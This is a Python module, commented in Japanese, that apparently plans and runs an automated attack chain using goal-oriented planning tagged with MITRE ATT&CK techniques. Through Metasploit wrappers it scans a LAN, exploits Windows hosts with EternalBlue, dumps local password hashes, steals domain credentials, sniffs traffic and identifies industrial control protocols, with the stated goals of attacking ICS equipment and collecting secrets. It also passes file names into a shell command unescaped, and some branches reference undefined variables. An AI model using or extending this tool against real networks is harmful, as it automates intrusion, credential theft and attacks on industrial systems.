# goap module
# actions.json からすべてのアクションを読み込み、
# 現在のシンボル値から最適なアクションを選択し、
# ゴールまでのルートを決める。
# アクション実施前に現在のシンボルを確認し、
# ルートを組み替える処理も必要。
# ネットワークセグメント単位でシンボルを割り当てていく
from arsenal import arpscan
from arsenal import mynmap
from arsenal import write_json
from arsenal import msploit
from arsenal import masscan
import json
import random
import time
import subprocess
import copy

# シンボルを定義
class GoapSymbol():
  # 発見したデバイス情報を格納する辞書
  node = []
  link = []
  node_json = {}
  attack_list = {} # ipaddress と node の配列番号を管理
  node_id = 0
  pre_node_id = 0

  def __init__(self, actionfile):
    print("init symbol..")

    # 各アクションの格納
    self.actions = self.load_action(actionfile)
   
    # ゴール条件
    self.goal = {
      # 制御機器を攻撃したか 
      "GoalSymbol_AttackIcs": True, 
      # 機密情報を収集したか
      "GoalSymbol_GetSecretInfo": True
    }

    # 現在値
    self.state = {
      # 同一LANの端末を探索したか T1120
      "Symbol_GetLanNodes": False,
      # TCP ポートスキャンを実行したか T1046 T1018
      "Symbol_TcpScan": False,
      # UDP ポートスキャンを実行したか T1046 T1018
      "Symbol_UdpScan": False,
      # 端末のOSを特定したか T1003, T1059
      "Symbol_IdentOs": False,
      # 横展開しているか TA0008
      "Symbol_LateralMovement": False,
      # ブルートフォースアタックを実行したか T1110
      "Symbol_BruteForce": False,
      # ARP Cache Poisoning をしたか T1557 T1112(registry modify)
      "Symbol_ArpPoisoning": False,
      # ネットワーク情報を取得したか T1016, T1049
      "Symbol_GetNetworkInfo": False,
      # 端末のOSのパッチ情報などを取得したか T1003, T1059, T1082
      "Symbol_GetOsCredential": False,
      # 権限昇格しているか TA0004
      "Symbol_PrivilegeEscalation": False,
      # DC を探索したか T1482
      "Symbol_DCCheck": False,
      # ログオンユーザ情報を収集したか T1059
      "Symbol_LogonUserInfo": False,
      # ドメインユーザの探索 T1087
      "Symbol_DomainUser": False,
      # ローカルユーザの探索 T1087
      "Symbol_LocalUser": False,
      # 有効なアカウントを利用したか T1078
      "Symbol_ValidUser": False,
      # 不正なアカウントを作成したか T1136
      "Symbol_CreateUser": False,
      # プロセス情報を収集したか(セキュリティ製品の探索も行う) T1057, T1059 
      "Symbol_ProcessInfo": False,
      # 別のプロセスに移動したか T1055
      "Symbol_ProcessMigrate": False,
      # 主要なディレクトリを調査したか T1083, TA0009, TA0010
      "Symbol_MainDriveInfo": False,
      # ネットワークドライブを確認したか T1083, T1135
      "Symbol_NetDriveInfo": False,
      # 機密情報を収集したか TA0009
      "GoalSymbol_GetSecretInfo": False,
      # 別のネットワークセグメントを特定したか
      "Symbol_NetworkSegmentCheck": False,
      # パケットを収集したか T1040
      "Symbol_PacketInfo": False,
      # ICS プロトコルを特定したか T1046
      "Symbol_GetIcsProtocol": False,
      # ICS 機器を発見したか T1120
      "Symbol_GetIcs": False,
      # ICS 機器を攻撃したか TA0040
      "GoalSymbol_AttackIcs": False
    }


  # action.jsonの読み込み
  def load_action(self, actionfile): 
    with open(actionfile) as f:
      return json.load(f)

  
  # goap で planning する関数
  def goap_plannning(self, goap_node):
    # 発見したデバイス情報を格納する辞書
  
    available_action = []
    plan = []
  
    #print("actions = {}".format(goap_node.actions))
    #print("goal = {}".format(goap_node.goal))
    #print("state = {}".format(goap_node.state))
  
    #print(goap_node.actions.keys())
    #print(goap_node.actions["arpscan"].keys())
    #print(goap_node.actions["arpscan"]["effect"].keys())
  
    print("goap planning start..")
  
    # 仮に100回ほどループさせるようにしている
    # 最終的には、ゴールになるまでループさせる
    for i in range(100):
      print("\n")
      print("take = {}".format(i))
      print("\n")
      if (goap_node.state["GoalSymbol_AttackIcs"] == goap_node.goal["GoalSymbol_AttackIcs"] or goap_node.state["GoalSymbol_GetSecretInfo"] == goap_node.goal["GoalSymbol_GetSecretInfo"]):
        print(plan)
        print("final_state = {}".format(goap_node.state))
        return plan
        #print("\n")
        #print("goap_node planning = {}".format(plan))
        # demo用
        #plan = ['arpscan', 'tcpscan_nmap', 'get_os_credential', 'get_maindrvinfo', 'exploit_lateral', 'get_networkinfo', 'priv_escalation', 'get_packetinfo', 'detect_ics_protocol', 'detect_ics', 'attack_ics']
        #print("goap_node planning = {}".format(plan))
        #print("\n")
        #movie_demo(plan, node, link)
        #return 0
        #exit(0)
        #break
  
      # 現在の state 値から実行できる action を取り出す
      for key in goap_node.actions.keys():
        match_count = 0
        for symbol, value in goap_node.actions[key]["precond"].items():
          print("{}, {}, {}".format(key, symbol, value))
          if (goap_node.state[symbol] == value):
            match_count += 1
        if (match_count == len(goap_node.actions[key]["precond"])):
          print("match!!")
          available_action.append(key)
  
      print("available_action = {}".format(available_action))
  
      # 何もアクションを実行できない場合は終了する
      if (len(available_action) == 0):
        print("No action")
        exit(0)
  
      # 実行できる action から一つを選択する
      # 現在はダイクストラ法で選択している (優先度順)
      # A* かダイクストラかランダムか
      tmp = 100
      tmp_list = []
      for key in available_action:
        if (goap_node.actions[key]["priority"] < tmp):
          priority_key = key
          tmp = goap_node.actions[key]["priority"]
          tmp_list.clear()
          tmp_list.append(priority_key)
        elif (goap_node.actions[key]["priority"] == tmp):
          tmp_list.append(key)
  
      print("tmp_list = {}".format(tmp_list))
      print("len(tmp_list) = {}".format(len(tmp_list)))
  
      # 同じ優先度リストの中からランダムに取り出し
      # これまでに選択した内容とは被らないものを選択する
      #for i in range(len(tmp_list)):
      #  if priority_key not in plan:
      #    break
  
      while (True):
        priority_key = random.choice(tmp_list)
        if priority_key not in plan:
          break
  
      print("{}, {}".format(priority_key, goap_node.actions[priority_key]))
  
      #print("pre_choise_key = {}".format(pre_choise_key))
  
      plan.append(priority_key)
      available_action.clear()
  
      print("plan = {}".format(plan))
  
      print("state = {}".format(goap_node.state))
  
      # action の結果を state に反映
      for key, value in goap_node.actions[priority_key]["effect"].items():
        goap_node.state[key] = value
        print("key = {}, value = {}".format(key, value))
  
      print("state = {}".format(goap_node.state))


  # target を選定する関数
  def select_target(self):
    target_list = {}
    secondary_list = {}

    # Windows 端末の探索
    for num in range(1, len(self.node), 1):
      if self.node[num]["os"] == "Windows":
        # 攻撃成功セッションがなければ攻撃候補にする
        if self.node[num]["session"] == "":
          target_list[self.node[num]["id"]] = num
        else:
          secondary_list[self.node[num]["id"]] = num

    print("target_list = {}".format(target_list))
    print("secondary_list = {}".format(secondary_list))

    # 候補の中からランダムにターゲットを選定
    # 今後、ターゲットの選定方法の条件を追加する
    target, node_num = random.choice(list(target_list.items()))
    
    target_list.clear()
    secondary_list.clear()

    return target, node_num


  # planning を実行する関数
  def plan_execute(self, goap_node, node_id, plan):

    print("plan = {}".format(plan))
    #plan = ["arpscan", "tcpscan", "exploit_lateral", "get_processinfo", "get_networkinfo", "get_local_user", "get_domain_user", "get_netdrvinfo", "get_packetinfo", "detect_ics_protocol"]
    #plan = ["arpscan", "tcpscan", "exploit_lateral", "get_processinfo", "get_networkinfo", "get_local_user", "get_domain_user", "get_networkinfo"]
    #plan = ["arpscan", "tcpscan", "exploit_lateral", "ipconfig", "ps", "netstat", "netuse", "netuser", "netuserdomain", "netuse", "creds_tspkg"]
    #plan = ["exploit_lateral2"]
    #plan = ["creds_tspkg", "arpscan_fm_mp"]
    print("plan = {}".format(plan))

    for p in plan:
      print("action = {}".format(p))

      # arp scan の実施
      if p == "arpscan":
        pre_node_id = node_id
        arpscanInstance = arpscan.ArpScan()
        node_id = arpscanInstance.execute_arpscan(self.node, self.link, node_id)
        #print(node)
        #print(link)

        self.node_json['nodes'] = self.node
        self.node_json['links'] = self.link
        print("node_json = {}".format(self.node_json))
        #print("node_id = {}".format(node_id))

        # nodes を json 形式にして書き込み
        wjson = write_json.WriteJson()
        wjson.write(self.node_json)

        goap_node.state["Symbol_GetLanNodes"] = True

        #return node_id

      # metasploit 経由での ARP
      elif p == "arpscan_mp":
        exploit = msploit.MetaSploit()
        exploit.execute_arpscan("10.2.200.0", "255.255.0.0")

        pre_node_id = node_id
        arpscanInstance = arpscan.ArpScan()

        node_id = arpscanInstance.execute_arpscan_fm_mp(node, link, node_id)

        node_json['nodes'] = node
        node_json['links'] = link
        print("node_json = {}".format(node_json))
        print("node_id = {}".format(node_id))

        # nodes を json 形式にして書き込み
        wjson.write(node_json)
        wjson.write(self.node_json)

        goap_node.state["Symbol_GetLanNodes"] = True

      # tcp scan の実施
      elif p == "tcpscan":
        # nmap の実施
        mynmapInstance = mynmap.MyNmap()

        for num in range(pre_node_id, node_id, 1):
          mynmapInstance.execute_nmap(self.node[num]["id"], num, self.node)
          #execute_nmap(node[num]["ipaddr"], num, node)

        #self.node_json['nodes'] = self.node
        #self.node_json['links'] = self.link
        print("node_json = {}".format(self.node_json))
        #print("node_id = {}".format(node_id))

        # nodes を json 形式にして書き込み
        wjson = write_json.WriteJson()
        wjson.write(self.node_json)

        goap_node.state["Symbol_TcpScan"] = True


      # lateral movement(eternalblue) の実行
      elif p == "exploit_lateral":
        # ターゲットにする端末を選定し、IP アドレスを格納
        target, node_num = self.select_target()

        # Metasploit 実行
        exploit = msploit.MetaSploit()
        res = exploit.execute_eternalblue(target, node_num, self.node)

        # 攻撃に成功した場合、IP アドレスを管理
        # target を成功した IP アドレスにする
        if res == 0:
          self.attack_list[target] = node_num
          print("attack_list = {}".format(self.attack_list))
          target = self.node[node_num]["id"]
          goap_node.state["Symbol_LateralMovement"] = True


      # ネットワーク情報の取得
      elif p == "get_networkinfo":
        # ipconfig の実施
        exploit = msploit.MetaSploit()
        exploit.execute_ipconfig(self.attack_list[target], self.node)

        # netstat の実施
        exploit.execute_netstat(self.attack_list[target], self.node)
          
        goap_node.state["Symbol_GetNetworkInfo"] = True

        
      # プロセスの取得とセキュリティツールの動作確認の実施
      elif p == "get_processinfo":
        # Metasploit 実行
        exploit = msploit.MetaSploit()
        exploit.execute_ps(self.attack_list[target], self.node)

        # nodes を json 形式にして書き込み
        wjson = write_json.WriteJson()
        wjson.write(self.node_json)

        goap_node.state["Symbol_ProcessInfo"] = True

      # local user の一覧とパスワードの取得
      elif p == "get_local_user":
        # Metasploit 実行
        exploit = msploit.MetaSploit()
        exploit.execute_netuser(self.attack_list[target], self.node)

        # local account の password と hash dump を取得
        exploit.get_hash(target, self.attack_list[target], self.node)

        # nodes を json 形式にして書き込み
        wjson = write_json.WriteJson()
        wjson.write(self.node_json)

        goap_node.state["Symbol_LocalUser"] = True

      # domain user の一覧とパスワードの取得
      elif p == "get_domain_user":
        # net user /domain 実行
        exploit = msploit.MetaSploit()
        exploit.execute_netuserdomain(self.attack_list[target], self.node)

        # creds tspkg の実施 (domain のパスワードを取得)
        exploit.execute_creds_tspkg(self.attack_list[target], self.node)

        # nodes を json 形式にして書き込み
        wjson = write_json.WriteJson()
        wjson.write(self.node_json)

        goap_node.state["Symbol_DomainUser"] = True

      # ネットワークドライブの探索
      elif p == "get_netdrvinfo":
        # net user の実施
        exploit = msploit.MetaSploit()
        exploit.execute_netuse(self.attack_list[target], self.node)

        # nodes を json 形式にして書き込み
        wjson = write_json.WriteJson()
        wjson.write(self.node_json)

        goap_node.state["Symbol_NetDriveInfo"] = True

      # パケットの取得
      elif p == "get_packetinfo":
        # network sniffing の実施
        exploit = msploit.MetaSploit()
        exploit.execute_sniff(self.attack_list[target], self.node)

        # nodes を json 形式にして書き込み
        wjson = write_json.WriteJson()
        wjson.write(self.node_json)

        goap_node.state["Symbol_PacketInfo"] = True

      # パケット解析による ICS プロトコルの特定
      elif p == "detect_ics_protocol":
        num = self.attack_list[target]
        
        p_list = {}
        p_list.clear()

        # pcap file の解析と ICS プロトコルの特定
        for pcap in self.node[num]["pcap_list"]:
          print('analyze pcap for detect ics protocol...')

          # ics protocol list と照合
          with open('./arsenal/ics_protocol_list.txt') as f:
            for protocol in f:
              protocol = protocol.replace('\n', '')
              try: # pcap を tshark にて解析
                res = subprocess.check_output('tshark -r ' + pcap + ' | grep -i \" ' + protocol + ' \"', shell=True).decode('utf-8')
                print(res)

                rows = res.splitlines()
                for row in rows:
                  c = row.split()
                  p_list[c[4]] = protocol

              except:
                print("tshark error!!")

        self.node[num]["ics_protocol"] = copy.deepcopy(p_list)

        # nodes を json 形式にして書き込み
        wjson = write_json.WriteJson()
        wjson.write(self.node_json)

        goap_node.state["Symbol_GetIcsProtocol"] = True


      # ローカルドライブ上の機密情報の探索
      elif p == "get_local_secretinfo":
        pass


      # ネットワークドライブ上の機密情報の探索
      elif p == "get_nw_secretinfo":
        pass


      # 別セグメントのネットワーク探索
      elif p == "chk_network_segment":
        pass
        

    print("node = {}".format(self.node))
    return node_id

